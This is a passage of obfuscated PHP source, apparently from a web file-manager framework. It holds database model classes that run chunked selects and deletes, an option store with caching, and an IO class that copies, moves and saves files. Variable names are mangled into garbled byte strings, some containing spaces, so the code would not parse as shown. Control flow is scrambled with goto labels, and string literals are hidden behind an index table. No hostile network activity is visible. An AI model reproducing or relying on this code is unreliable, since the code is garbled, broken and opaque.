$fá™Ûá‡‘Å[$E‘¤ä®ÚØ³[271]][$B¶ãÄŒ«šİ][1] = $c‚¼æ–ßêš; $this->optionsValue($fá™Ûá‡‘Å); $dò’°‹õ×ª += parent::save($Eå‹‹ÊöĞí, $döñÒŒ‚Ô»); $this->chunkEventCheck(count($c‚¼æ–ßêš)); } $this->chunkEventSet(); return $dò’°‹õ×ª; goto F±«¸¬™¤Š; d·©¾ªÀÂÕ: $f½¦â÷ä§† = $fá™Ûá‡‘Å[$E‘¤ä®ÚØ³[271]][$B¶ãÄŒ«šİ][1]; $f½¦â÷ä§† = is_array($f½¦â÷ä§†) ? $f½¦â÷ä§† : array(); $D¦Õ«Ê„¾Æ = count($f½¦â÷ä§†); goto FÕÕ‚‹¶; F±«¸¬™¤Š: } public function add($b‚‰ÇÌÍïó = '', $AøºÁ°Ïã = array(), $aĞğ¯á¿ìÕ = false) { if ($this->addTaskStatus && is_array($b‚‰ÇÌÍïó)) { $this->addTaskData[] = $b‚‰ÇÌÍïó; return; } return parent::add($b‚‰ÇÌÍïó, $AøºÁ°Ïã, $aĞğ¯á¿ìÕ); } public function parseWhereLike($e²¦¨ªİÊ“, $F’ìõëŞœø = '', $b²¸›ÌÖãé = false, &$d©­’ÚÎ¦ = false) { goto b§Ù…ïª‡®; e’¯†ê¤ˆ: foreach ($e²¦¨ªİÊ“ as $DŒ’é‰–ö² => $c¤ëÒî´ğğ) { if (is_array($c¤ëÒî´ğğ) && count($c¤ëÒî´ğğ) == 2 && $c¤ëÒî´ğğ[0] == $a¶²Ã÷çÎ‰[375] && is_string($c¤ëÒî´ğğ[1]) && substr($c¤ëÒî´ğğ[1], 0, 1) == $a¶²Ã÷çÎ‰[376] && substr($c¤ëÒî´ğğ[1], strlen($c¤ëÒî´ğğ[1]) - 1, 1) == $a¶²Ã÷çÎ‰[376]) { goto f¦‹çç£…Ğ; f¦‹çç£…Ğ: $d©­’ÚÎ¦ = !0; $CïÊò¹®®— = is_string($DŒ’é‰–ö²) ? $DŒ’é‰–ö² : $F’ìõëŞœø; $c°¬î‹¯¸Â = substr($c¤ëÒî´ğğ[1], 1, strlen($c¤ëÒî´ğğ[1]) - 2); goto DÓ‹—­¤¹ƒ; DÓ‹—­¤¹ƒ: $c°¬î‹¯¸Â = $this->db->escapeString($c°¬î‹¯¸Â); if (!strpos($CïÊò¹®®—, $a¶²Ã÷çÎ‰[94])) { $CïÊò¹®®— = $a¶²Ã÷çÎ‰[377] . $CïÊò¹®®— . $a¶²Ã÷çÎ‰[377]; } if ($c±áŒ‚ôãİ[$a¶²Ã÷çÎ‰[378]]) { $c°¬î‹¯¸Â = $a¶²Ã÷çÎ‰[115] . $c°¬î‹¯¸Â . $a¶²Ã÷çÎ‰[115]; } goto F‚Â½Óîœ; F‚Â½Óîœ: $e¨øïµ›à¢[$fİÔóÕîùÛ] = $a¶²Ã÷çÎ‰[379] . $CïÊò¹®®— . $a¶²Ã÷çÎ‰[380] . $c°¬î‹¯¸Â . $a¶²Ã÷çÎ‰[381]; $fİÔóÕîùÛ++; continue; goto fğÖÙ•ôÉ’; fğÖÙ•ôÉ’: } if (is_array($c¤ëÒî´ğğ)) { $F’ìõëŞœø = is_string($DŒ’é‰–ö²) ? $DŒ’é‰–ö² : $F’ìõëŞœø; $c¤ëÒî´ğğ = $this->parseWhereLike($c¤ëÒî´ğğ, $F’ìõëŞœø, !0, $d©­’ÚÎ¦); } if (is_numeric($DŒ’é‰–ö²)) { $e¨øïµ›à¢[$fİÔóÕîùÛ] = $c¤ëÒî´ğğ; $fİÔóÕîùÛ++; } else { $e¨øïµ›à¢[$DŒ’é‰–ö²] = $c¤ëÒî´ğğ; } } if ($d©­’ÚÎ¦ && !$b²¸›ÌÖãé) { trace_log(array($e¨øïµ›à¢, $e²¦¨ªİÊ“), $a¶²Ã÷çÎ‰[271]); } return $e¨øïµ›à¢; goto E™×•À•; B¿Û™ùµ“¸: if (!is_array($e²¦¨ªİÊ“)) { return $e²¦¨ªİÊ“; } $e¨øïµ›à¢ = array(); $fİÔóÕîùÛ = 0; goto e’¯†ê¤ˆ; b§Ù…ïª‡®: $a¶²Ã÷çÎ‰ =& $_SERVER[Æ¼ôºÙï]; $c±áŒ‚ôãİ = $GLOBALS[$a¶²Ã÷çÎ‰[6]][$a¶²Ã÷çÎ‰[373]]; if (!$c±áŒ‚ôãİ[$a¶²Ã÷çÎ‰[374]]) { return $e²¦¨ªİÊ“; } goto B¿Û™ùµ“¸; E™×•À•: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($b²¿µœ÷è¼ = array()) { goto d‡©÷å²¾…; d‡©÷å²¾…: $a ¬ö‰Ÿ‹‚ =& $_SERVER[Æ¼ôºÙï]; $AÏßÎ‡Ì­ß = self::SQL_WHERE_IN_CHUNK; $Aø–§¢¯Öí = $this->optionsValue(); goto BäˆÚ‰«Œô; BäˆÚ‰«Œô: $C…–ÊËº¾õ = $this->findWhereField($Aø–§¢¯Öí); if (!$C…–ÊËº¾õ || isset($Aø–§¢¯Öí[$a ¬ö‰Ÿ‹‚[288]]) || isset($Aø–§¢¯Öí[$a ¬ö‰Ÿ‹‚[349]])) { return parent::select($b²¿µœ÷è¼); } $d¤„È—ÀÀ¾ = $Aø–§¢¯Öí[$a ¬ö‰Ÿ‹‚[271]][$C…–ÊËº¾õ][1]; goto f¯«†Ø¹Œ; f¯«†Ø¹Œ: $d¤„È—ÀÀ¾ = is_array($d¤„È—ÀÀ¾) ? $d¤„È—ÀÀ¾ : array(); $aÊ¾Î¥›õ = null; for ($EÒ™ˆ™ÄÆ‡ = 0; $EÒ™ˆ™ÄÆ‡ < count($d¤„È—ÀÀ¾); $EÒ™ˆ™ÄÆ‡ += $AÏßÎ‡Ì­ß) { $béÖöË–£¬ = array_slice($d¤„È—ÀÀ¾, $EÒ™ˆ™ÄÆ‡, $AÏßÎ‡Ì­ß); if (!is_array($béÖöË–£¬) || count($béÖöË–£¬) == 0) { break; } $Aø–§¢¯Öí[$a ¬ö‰Ÿ‹‚[271]][$C…–ÊËº¾õ][1] = $béÖöË–£¬; $this->optionsValue($Aø–§¢¯Öí); $f…«ÌÆ×· = parent::select($b²¿µœ÷è¼); if (!$f…«ÌÆ×·) { continue; } if (is_null($aÊ¾Î¥›õ)) { $aÊ¾Î¥›õ = array(); } $aÊ¾Î¥›õ = array_merge($aÊ¾Î¥›õ, $f…«ÌÆ×·); } goto eõ…ª¦äÂÕ; eõ…ª¦äÂÕ: return $aÊ¾Î¥›õ; goto cŠö‰Ó†Ïš; cŠö‰Ó†Ïš: } public function delete($Bñ¥ùä½—¯ = array()) { goto B¼­âíŒ«; dóÁæÇ¤¡‚: $aèôïÃñ§ª = $DÃçÇ´»¦‹[$E˜±ğ‘£ù˜[271]][$D“Öâ¨¤‘][1]; $aèôïÃñ§ª = is_array($aèôïÃñ§ª) ? $aèôïÃñ§ª : array(); for ($CìŒø²‚ÃÕ = 0; $CìŒø²‚ÃÕ < count($aèôïÃñ§ª); $CìŒø²‚ÃÕ += $Bç“ñŒ¥·) { $CçÚ¦·Ó = array_slice($aèôïÃñ§ª, $CìŒø²‚ÃÕ, $Bç“ñŒ¥·); if (!is_array($CçÚ¦·Ó) || count($CçÚ¦·Ó) == 0) { break; } $DÃçÇ´»¦‹[$E˜±ğ‘£ù˜[271]][$D“Öâ¨¤‘][1] = $CçÚ¦·Ó; $this->optionsValue($DÃçÇ´»¦‹); $a×´ÅßÓ—ö += parent::delete($Bñ¥ùä½—¯); } goto EÜÛ¬»¹¤; BÁÕÙ¼›ĞÌ: $D“Öâ¨¤‘ = $this->findWhereField($DÃçÇ´»¦‹); if (!$D“Öâ¨¤‘) { return parent::delete($Bñ¥ùä½—¯); } $a×´ÅßÓ—ö = 0; goto dóÁæÇ¤¡‚; EÜÛ¬»¹¤: return $a×´ÅßÓ—ö; goto B×ÚªÜ¡õ¢; B¼­âíŒ«: $E˜±ğ‘£ù˜ =& $_SERVER[Æ¼ôºÙï]; $Bç“ñŒ¥· = self::SQL_WHERE_IN_CHUNK; $DÃçÇ´»¦‹ = $this->optionsValue(); goto BÁÕÙ¼›ĞÌ; B×ÚªÜ¡õ¢: } private function findWhereField($b–ë¨«ùÌ™) { $FÌª§’ÆÕã =& $_SERVER[Æ¼ôºÙï]; $B¬ÚÅ¥ˆİğ = self::SQL_WHERE_IN_CHUNK; if (!is_array($b–ë¨«ùÌ™) || !is_array($b–ë¨«ùÌ™[$FÌª§’ÆÕã[271]])) { return !1; } foreach ($b–ë¨«ùÌ™[$FÌª§’ÆÕã[271]] as $a«…İíî±³ => $e¦ŠŞ‡Æà) { if (is_array($e¦ŠŞ‡Æà) && isset($e¦ŠŞ‡Æà[0]) && is_string($e¦ŠŞ‡Æà[0]) && strtolower($e¦ŠŞ‡Æà[0]) == $FÌª§’ÆÕã[7] && is_array($e¦ŠŞ‡Æà[1]) && count($e¦ŠŞ‡Æà[1]) > $B¬ÚÅ¥ˆİğ) { ignore_timeout(); return $a«…İíî±³; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\x65\155\x4f\160\x74\x69\x6f\x6e"; public $field = array(); public function listData($BÑùƒ¤©ô  = false, $b‡¯Ó¿‘’‰ = "\x6d\x6f\x64\151\146\171\x54\151\155\145", $aè˜œˆ¥Á® = false) { $B¯ˆÉÌÌ ‚ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$B¯ˆÉÌÌ ‚) { return $BÑùƒ¤©ô  ? null : array(); } if (!$BÑùƒ¤©ô ) { $B¯ˆÉÌÌ ‚ = array_filter(array_values($B¯ˆÉÌÌ ‚)); return array_sort_by($B¯ˆÉÌÌ ‚, $b‡¯Ó¿‘’‰, $aè˜œˆ¥Á®); } return $B¯ˆÉÌÌ ‚[$_SERVER[Æ¼ôºÙï][382] . $BÑùƒ¤©ô ]; } public function insert($DÇ…¢Ëê‰É) { goto b¿îÄ’é; b¨Ëˆ·Š‰: return $bÙèÑ§Êí½; goto d—³‚ŒÓÔÑ; b¿îÄ’é: $Cò†Š˜šÀš =& $_SERVER[Æ¼ôºÙï]; $DÇ…¢Ëê‰É = array_field_key($DÇ…¢Ëê‰É, $this->field); $bÙèÑ§Êí½ = Model($this->modelType)->get($Cò†Š˜šÀš[383], $this->optionType . $Cò†Š˜šÀš[384]); goto C²ò™ø“õ; C²ò™ø“õ: $bÙèÑ§Êí½ = $bÙèÑ§Êí½ ? $bÙèÑ§Êí½ : 0; $DÇ…¢Ëê‰É[$Cò†Š˜šÀš[385]] = ++$bÙèÑ§Êí½; $DÇ…¢Ëê‰É[$Cò†Š˜šÀš[192]] = time(); goto C±Æê°Ø‘; C±Æê°Ø‘: $DÇ…¢Ëê‰É[$Cò†Š˜šÀš[83]] = time(); Model($this->modelType)->set($Cò†Š˜šÀš[383], $bÙèÑ§Êí½, $this->optionType . $Cò†Š˜šÀš[384]); Model($this->modelType)->set($Cò†Š˜šÀš[382] . $bÙèÑ§Êí½, $DÇ…¢Ëê‰É, $this->optionType); goto b¨Ëˆ·Š‰; d—³‚ŒÓÔÑ: } public function update($bÍî†É…È, $Dˆ¶ÀÚµĞ„) { goto AÅ†¼¡‚Ï½; AÅ†¼¡‚Ï½: $aí±Ï„æ¸¦ =& $_SERVER[Æ¼ôºÙï]; $Dˆ¶ÀÚµĞ„ = array_field_key($Dˆ¶ÀÚµĞ„, $this->field); $bšéÙì‰Š” = $this->listData($bÍî†É…È); goto cß§ëÆ…·; Cí³“¢ë¶: return Model($this->modelType)->set($aí±Ï„æ¸¦[382] . $bÍî†É…È, $Dˆ¶ÀÚµĞ„, $this->optionType); goto cš‰è¾ÃÀí; cß§ëÆ…·: if (!$bšéÙì‰Š”) { return !1; } $Dˆ¶ÀÚµĞ„ = array_merge($bšéÙì‰Š”, $Dˆ¶ÀÚµĞ„); $Dˆ¶ÀÚµĞ„[$aí±Ï„æ¸¦[83]] = time(); goto Cí³“¢ë¶; cš‰è¾ÃÀí: } public function remove($dÁ¢ÉŒŞ‚) { return Model($this->modelType)->remove($_SERVER[Æ¼ôºÙï][382] . $dÁ¢ÉŒŞ‚, $this->optionType); } public function clear() { $Eœ÷í¸´¤ò =& $_SERVER[Æ¼ôºÙï]; Model($this->modelType)->remove($Eœ÷í¸´¤ò[383], $this->optionType . $Eœ÷í¸´¤ò[384]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($b§´Ší˜ÔÇ, $A¨‰¤ô¼±Í) { if (!$A¨‰¤ô¼±Í) { return !1; } $dš¥˜Ö°¡— = $this->listData(); $dš¥˜Ö°¡— = array_to_keyvalue($dš¥˜Ö°¡—, $b§´Ší˜ÔÇ); return isset($dš¥˜Ö°¡—[$A¨‰¤ô¼±Í]) ? $dš¥˜Ö°¡—[$A¨‰¤ô¼±Í] : !1; } public function findByName($dÖ·¹¶âä„) { return $this->findByKey($_SERVER[Æ¼ôºÙï][28], $dÖ·¹¶âä„); } protected function resetData($C¸„¶à¸¡Æ) { $D¬‹ó‚…Ì =& $_SERVER[Æ¼ôºÙï]; $C¸„¶à¸¡Æ = is_array($C¸„¶à¸¡Æ) ? $C¸„¶à¸¡Æ : array(); $aëÖØ÷£Êä = array(); for ($Bñ«µš¾ = 0; $Bñ«µš¾ < count($C¸„¶à¸¡Æ); $Bñ«µš¾++) { $aëÖØ÷£Êä[$D¬‹ó‚…Ì[382] . $C¸„¶à¸¡Æ[$Bñ«µš¾][$D¬‹ó‚…Ì[385]]] = $C¸„¶à¸¡Æ[$Bñ«µš¾]; } return Model($this->modelType)->set($aëÖØ÷£Êä, !1, $this->optionType); } private function getAutoName($cå”Å„Ï‹Ş) { $cÌ¶—ĞÁ×Ô = array_to_keyvalue($this->listData(), $_SERVER[Æ¼ôºÙï][28]); if (!$cÌ¶—ĞÁ×Ô || !isset($cÌ¶—ĞÁ×Ô[$cå”Å„Ï‹Ş])) { return $cå”Å„Ï‹Ş; } for ($Bº¥³½Éè® = 1; $Bº¥³½Éè® < count($cÌ¶—ĞÁ×Ô); $Bº¥³½Éè®++) { $DØ¯¾ÓÍ…Ş = $cå”Å„Ï‹Ş . "\50{$Bº¥³½Éè®}\51"; if (!isset($cÌ¶—ĞÁ×Ô[$DØ¯¾ÓÍ…Ş])) { return $DØ¯¾ÓÍ…Ş; } } return $DØ¯¾ÓÍ…Ş; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($dƒÌ£æ = false, $E¼¾¨©¹ìã = '', $F¡å…½µ“ƒ = false) { goto C»—Íœ½Øƒ; FŞŞã«Şê‡: $this->cacheSet($E¼¾¨©¹ìã, $BÊ†Ìô¦Í); $BÊ†Ìô¦Í = array_merge($Bë™ÅÅ¦, $BÊ†Ìô¦Í); return $dƒÌ£æ ? $BÊ†Ìô¦Í[$dƒÌ£æ] : $BÊ†Ìô¦Í; goto Bõ«»²‡ò†; eé³©¥Œ: $BÊ†Ìô¦Í = $this->where($fâêÙ±Ïµ)->select(); $BÊ†Ìô¦Í = array_to_keyvalue($BÊ†Ìô¦Í, $F§è¯ã½Ñ½[92], $F§è¯ã½Ñ½[368]); foreach ($BÊ†Ìô¦Í as $bŒĞå¾•ª => $B×˜ÈæÎÈ) { if ($F¡å…½µ“ƒ || in_array($bŒĞå¾•ª, $this->jsonField)) { $BÊ†Ìô¦Í[$bŒĞå¾•ª] = json_decode($B×˜ÈæÎÈ, !0); } } goto FŞŞã«Şê‡; AáÏŞíõ¾Œ: $Bë™ÅÅ¦ = is_array($Bë™ÅÅ¦) ? $Bë™ÅÅ¦ : array(); if (is_array($BÊ†Ìô¦Í)) { $BÊ†Ìô¦Í = array_merge($Bë™ÅÅ¦, $BÊ†Ìô¦Í); return $dƒÌ£æ ? isset($BÊ†Ìô¦Í[$dƒÌ£æ]) ? $BÊ†Ìô¦Í[$dƒÌ£æ] : null : $BÊ†Ìô¦Í; } $fâêÙ±Ïµ = $this->filterWhere(array($F§è¯ã½Ñ½[29] => $E¼¾¨©¹ìã)); goto eé³©¥Œ; C»—Íœ½Øƒ: $F§è¯ã½Ñ½ =& $_SERVER[Æ¼ôºÙï]; $BÊ†Ìô¦Í = $this->cacheGet($E¼¾¨©¹ìã); $Bë™ÅÅ¦ = $this->optionDefault($E¼¾¨©¹ìã); goto AáÏŞíõ¾Œ; Bõ«»²‡ò†: } public function set($A¸³…èŠ½, $fö°ÚìÂáÔ = false, $aˆÄ®°ÓË = '') { goto EÖ–ÏØĞÊ; F¨Ëì™Úê: return $this->addAll($D°Òã½‹Ç„, array(), !0); goto f™×é³¬•è; EÖ–ÏØĞÊ: $dää¾âÁ› =& $_SERVER[Æ¼ôºÙï]; $this->cacheRemove($aˆÄ®°ÓË); $D°Òã½‹Ç„ = array(); goto aïÑçÓÇÈ; aïÑçÓÇÈ: $aÉ‚éÛ¥¢Õ = is_array($A¸³…èŠ½) ? $A¸³…èŠ½ : array($A¸³…èŠ½ => $fö°ÚìÂáÔ); foreach ($aÉ‚éÛ¥¢Õ as $E›§Ñ”‚–ø => $Fçä•´—Õ) { if (is_array($Fçä•´—Õ)) { $Fçä•´—Õ = json_encode_force($Fçä•´—Õ); } $this->checkLength($Fçä•´—Õ, !1, $this->tableName . $dää¾âÁ›[4] . $A¸³…èŠ½); $Fçä•´—Õ = self::textEncode($Fçä•´—Õ); $aÉ‚éÛ¥¢Õ = array($dää¾âÁ›[29] => $aˆÄ®°ÓË, $dää¾âÁ›[92] => $E›§Ñ”‚–ø, $dää¾âÁ›[368] => $Fçä•´—Õ); $D°Òã½‹Ç„[] = $this->filterWhere($aÉ‚éÛ¥¢Õ); } if (!$D°Òã½‹Ç„) { return !0; } goto F¨Ëì™Úê; f™×é³¬•è: } protected function optionDefault($eï¼…Ñ¾• = '') { return !1; } public function setDeep($Bô¶±¨„, $A®ÅÆİõÙ· = false, $e‰²ŠÊŸ… = '') { $BÄçªöÉéÊ = explode($_SERVER[Æ¼ôºÙï][94], $Bô¶±¨„); $eÌÃ©ìã‰ = $this->get(); array_set_value($eÌÃ©ìã‰, $Bô¶±¨„, $A®ÅÆİõÙ·); $this->set($BÄçªöÉéÊ[0], $eÌÃ©ìã‰[$BÄçªöÉéÊ[0]], $e‰²ŠÊŸ…); } public function remove($D¢íˆ·§Ö…, $dø’¦²ï×Ì = '') { $cÏèŒŸì¯Õ =& $_SERVER[Æ¼ôºÙï]; $this->cacheRemove($dø’¦²ï×Ì); $C„Ğ³˜Å°œ = $this->filterWhere(array($cÏèŒŸì¯Õ[92] => $D¢íˆ·§Ö…, $cÏèŒŸì¯Õ[29] => $dø’¦²ï×Ì)); if (is_null($D¢íˆ·§Ö…)) { unset($C„Ğ³˜Å°œ[$cÏèŒŸì¯Õ[92]]); } return $this->where($C„Ğ³˜Å°œ)->delete(); } public function cacheSet($BöÜÚÜ‰µæ, $B£ïÂÕ÷à¬ = false) { return Cache::set($this->cacheKey($BöÜÚÜ‰µæ), $B£ïÂÕ÷à¬); } public function cacheGet($càĞ¸Ê”òë) { return Cache::get($this->cacheKey($càĞ¸Ê”òë)); } public function cacheRemove($CÛ¡àÜ—Ìä) { return Cache::remove($this->cacheKey($CÛ¡àÜ—Ìä)); } protected function filterWhere($f‘–¥”Òº¿) { return $f‘–¥”Òº¿; } protected function cacheKey($DƒÕê‰µò‡) { return $DƒÕê‰µò‡; } } goto f°õ‚ïàó; eÒåƒ¯«‰: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($aÌÚº–”ƒ÷, $f’Ø´’ÁİÕ) { goto c«ÑÔ—†¾·; c«ÑÔ—†¾·: $BÀøĞéå† =& $_SERVER[Æ¼ôºÙï]; $AªëÓôöîØ = $f’Ø´’ÁİÕ; $GLOBALS[$BÀøĞéå†[1022]] = $BÀøĞéå†[1023] . $aÌÚº–”ƒ÷; goto A„îƒ¶¢·‚; A„îƒ¶¢·‚: Hook::trigger($BÀøĞéå†[1023] . $aÌÚº–”ƒ÷ . $BÀøĞéå†[1024], $AªëÓôöîØ); $B†¨†ƒ¶ù = self::driverMake($f’Ø´’ÁİÕ[0]); if (method_exists($B†¨†ƒ¶ù, $aÌÚº–”ƒ÷)) { $F‡‘î½Å = @call_user_func_array(array($B†¨†ƒ¶ù, $aÌÚº–”ƒ÷), $f’Ø´’ÁİÕ); } else { if (method_exists($B†¨†ƒ¶ù, $BÀøĞéå†[1025])) { $F‡‘î½Å = @call_user_func_array(array($B†¨†ƒ¶ù, $aÌÚº–”ƒ÷), $f’Ø´’ÁİÕ); } else { if (method_exists(self, $aÌÚº–”ƒ÷)) { $F‡‘î½Å = @call_user_func_array(array(self, $aÌÚº–”ƒ÷), $f’Ø´’ÁİÕ); } else { $F‡‘î½Å = call_user_func_array(array(parent, $aÌÚº–”ƒ÷), $f’Ø´’ÁİÕ); } } } goto e²…áÉ¿Æ; e²…áÉ¿Æ: Hook::trigger($BÀøĞéå†[1023] . $aÌÚº–”ƒ÷ . $BÀøĞéå†[1026], $AªëÓôöîØ, $F‡‘î½Å); return $F‡‘î½Å; goto aºÁİšƒ›; aºÁİšƒ›: } public static function init($e¢¥î¶ÚÙÈ) { return self::driverMake($e¢¥î¶ÚÙÈ); } public static function copy($Fïïó¾»§, $A²ŠË¬„òî, $e…»ôêÓÍÅ = false, $f×§©¥Ó = false) { return self::copyMoveStart($Fïïó¾»§, $A²ŠË¬„òî, $e…»ôêÓÍÅ, $_SERVER[Æ¼ôºÙï][507], $f×§©¥Ó); } public static function move($e¶ÍÎÌ¶ì¨, $dÇĞ˜ÇÃ­Ã, $Aˆ¯Û¼¹‹á = false, $a…Î²¥³¯ = false) { return self::copyMoveStart($e¶ÍÎÌ¶ì¨, $dÇĞ˜ÇÃ­Ã, $Aˆ¯Û¼¹‹á, $_SERVER[Æ¼ôºÙï][509], $a…Î²¥³¯); } private static function copyMoveStart($dø…ÉºÌ­£, $dó²—¥ºÛ°, $E–Ê»®ê¨², $c—ïÃÊÆÅÚ, $c•°áŠº»ã) { $E‰ŞöŒç“ =& $_SERVER[Æ¼ôºÙï]; $e÷†›ËŸ…š = array($dø…ÉºÌ­£, $dó²—¥ºÛ°, $E–Ê»®ê¨², $c•°áŠº»ã); Hook::trigger($E‰ŞöŒç“[1023] . $c—ïÃÊÆÅÚ . $E‰ŞöŒç“[1024], $e÷†›ËŸ…š); $D¨ù¤ŒÉ™ï = self::copyMove($dø…ÉºÌ­£, $dó²—¥ºÛ°, $E–Ê»®ê¨², $c—ïÃÊÆÅÚ, $c•°áŠº»ã); Hook::trigger($E‰ŞöŒç“[1023] . $c—ïÃÊÆÅÚ . $E‰ŞöŒç“[1026], $e÷†›ËŸ…š, $D¨ù¤ŒÉ™ï); return $D¨ù¤ŒÉ™ï; } public static function saveFile($Bí„ÑâÃÕÔ, $C…ßïè„ï”, $D’™©Ö±¹ = true) { goto aÚã ïõ¢; aÚã ïõ¢: $AÆˆÀ§’åÉ =& $_SERVER[Æ¼ôºÙï]; $B„Æª£ñô = self::info($C…ßïè„ï”); $E¤ÈÓ¨Ë¤¹ = self::driverMake($Bí„ÑâÃÕÔ); goto EÉ›¯¿Çæ ; e§ÊøÛ¯â¥: $fË«ëÊğ…à = $C‰„Ö¨³–Ğ->pathFather($C…ßïè„ï”); $aœ»›áœ·İ = !0; if (!$D’™©Ö±¹ && self::driverIsSame($E¤ÈÓ¨Ë¤¹, $C‰„Ö¨³–Ğ)) { $aœ»›áœ·İ = !1; } goto a¹ËÆÃ£Ñà; EÉ›¯¿Çæ : $C‰„Ö¨³–Ğ = self::driverMake($C…ßïè„ï”); $Fô–ä­õ…Á = !1; if ($C‰„Ö¨³–Ğ->pathParse[$AÆˆÀ§’åÉ[1027]]) { $aÖ†â‡áßè = $C‰„Ö¨³–Ğ->pathParse[$AÆˆÀ§’åÉ[1027]]; $Fô–ä­õ…Á = $C‰„Ö¨³–Ğ; $C‰„Ö¨³–Ğ = self::driverMake($aÖ†â‡áßè); } goto e§ÊøÛ¯â¥; a¹ËÆÃ£Ñà: $c´¦‹öÚç¡ = self::copyFile($E¤ÈÓ¨Ë¤¹, $Bí„ÑâÃÕÔ, $C‰„Ö¨³–Ğ, $fË«ëÊğ…à, $B„Æª£ñô[$AÆˆÀ§’åÉ[28]], $aœ»›áœ·İ); if ($Fô–ä­õ…Á) { $c´¦‹öÚç¡ = $Fô–ä­õ…Á->getPathOuter($c´¦‹öÚç¡); } return $c´¦‹öÚç¡; goto fÄø¤ãË©; fÄø¤ãË©: } private static function copyMove($bšñŠÉ¹­Ó, $FË£¸¥Ñ¸, $E³½„ó«…¬, $e§º×Õ‰ŒÔ, $F·ë–âìÄå = false) { goto d¢ĞÓ¿¶İ¸; cÖÙœ ö‡ƒ: $DóãÀÁ²İÏ = self::driverMake($bšñŠÉ¹­Ó); $CÑí¹ƒ½‘ = self::driverMake($FË£¸¥Ñ¸); $DğªºË«–º = $e§º×Õ‰ŒÔ == $Fö«¨Š¬—–[509]; goto a†ƒ³æŠÃ•; a†ƒ³æŠÃ•: $c³Ò…»ğ = !1; if ($CÑí¹ƒ½‘->pathParse[$Fö«¨Š¬—–[1027]]) { $FË£¸¥Ñ¸ = $CÑí¹ƒ½‘->pathParse[$Fö«¨Š¬—–[1027]]; $c³Ò…»ğ = $CÑí¹ƒ½‘; $CÑí¹ƒ½‘ = self::driverMake($FË£¸¥Ñ¸); } self::check($DóãÀÁ²İÏ, $bšñŠÉ¹­Ó, $CÑí¹ƒ½‘, $FË£¸¥Ñ¸); goto fĞ¿»Åˆ¢Ñ; f‚­ª›ç‘é: if ($c³Ò…»ğ) { $D±ÚÀ½“õÉ = $c³Ò…»ğ->getPathOuter($D±ÚÀ½“õÉ); } return $D±ÚÀ½“õÉ; goto fõï½Å­Â–; E¨‘ô±³³: $c‚¤˜“’Á¤ = $DóãÀÁ²İÏ->isFile($bšñŠÉ¹­Ó); if (!$c‚¤˜“’Á¤ && $CÑí¹ƒ½‘->getType() == $Fö«¨Š¬—–[713] && $DóãÀÁ²İÏ->getType() == $Fö«¨Š¬—–[105]) { $D±ÚÀ½“õÉ = $CÑí¹ƒ½‘->copyFolderFromIO($DóãÀÁ²İÏ, $bšñŠÉ¹­Ó, $FË£¸¥Ñ¸, $E³½„ó«…¬, $DğªºË«–º, $F·ë–âìÄå); } else { $D±ÚÀ½“õÉ = self::copyPath($DóãÀÁ²İÏ, $bšñŠÉ¹­Ó, $CÑí¹ƒ½‘, $FË£¸¥Ñ¸, $E³½„ó«…¬, $DğªºË«–º, $c‚¤˜“’Á¤, $F·ë–âìÄå); } if ($D±ÚÀ½“õÉ && $DğªºË«–º) { $DóãÀÁ²İÏ->remove($bšñŠÉ¹­Ó); } goto f‚­ª›ç‘é; fĞ¿»Åˆ¢Ñ: Hook::trigger($Fö«¨Š¬—–[72], $DóãÀÁ²İÏ, $bšñŠÉ¹­Ó, $CÑí¹ƒ½‘, $FË£¸¥Ñ¸); $e¾‹Ïœ¦èÍ = self::driverIsSame($DóãÀÁ²İÏ, $CÑí¹ƒ½‘); if ($e¾‹Ïœ¦èÍ) { if ($e§º×Õ‰ŒÔ == $Fö«¨Š¬—–[509] && !method_exists($CÑí¹ƒ½‘, $Fö«¨Š¬—–[1028]) && trim($FË£¸¥Ñ¸, $Fö«¨Š¬—–[8]) == trim($CÑí¹ƒ½‘->pathFather($bšñŠÉ¹­Ó), $Fö«¨Š¬—–[8])) { if ($DóãÀÁ²İÏ->pathThis($bšñŠÉ¹­Ó) != $F·ë–âìÄå && !$DóãÀÁ²İÏ->isTypeObject()) { return $DóãÀÁ²İÏ->rename($bšñŠÉ¹­Ó, $F·ë–âìÄå); } return $CÑí¹ƒ½‘->getPathOuter($bšñŠÉ¹­Ó); } if (method_exists($CÑí¹ƒ½‘, $e§º×Õ‰ŒÔ)) { return $CÑí¹ƒ½‘->{$e§º×Õ‰ŒÔ}($bšñŠÉ¹­Ó, $FË£¸¥Ñ¸, $E³½„ó«…¬); } } goto E¨‘ô±³³; d¢ĞÓ¿¶İ¸: $Fö«¨Š¬—– =& $_SERVER[Æ¼ôºÙï]; if (!$bšñŠÉ¹­Ó || $bšñŠÉ¹­Ó == $Fö«¨Š¬—–[8] || !$FË£¸¥Ñ¸) { return !1; } ignore_timeout(); goto cÖÙœ ö‡ƒ; fõï½Å­Â–: } private static function check($F°…Êº›°, $b·±œÍ·Ó³, $Dæ«ºøÅÔª, &$fµÔª—ìŒ¤) { $B…†¼ïä‹à =& $_SERVER[Æ¼ôºÙï]; if (self::driverIsSame($F°…Êº›°, $Dæ«ºøÅÔª) && $F°…Êº›°->isFolder($b·±œÍ·Ó³) && $F°…Êº›°->isParentOf($b·±œÍ·Ó³, $fµÔª—ìŒ¤)) { show_json(LNG($B…†¼ïä‹à[1029]), !1); } if (!$F°…Êº›°->exist($b·±œÍ·Ó³)) { show_json(LNG($B…†¼ïä‹à[104]), !1); } } private static function copyPath($b§„³ÌÛ‚, $FØ×ê¸á‚æ, $DÕ‡öèåÌ, $B¢ùÒ¼š¹Å, $Cß½ŠÓè, $aİß²¨Éİ…, $AœÃ Œñ, $fç¸Ù¦„çğ = false) { goto E¥ÀÉ¤¹¤Ê; f¡Û¹£Õöµ: $Aêó‰½‰¢Ê = $DÕ‡öèåÌ->mkdir($DÕ‡öèåÌ->getPath($d˜Í‡óºÄ)); $B¢ùÒ¼š¹Å = 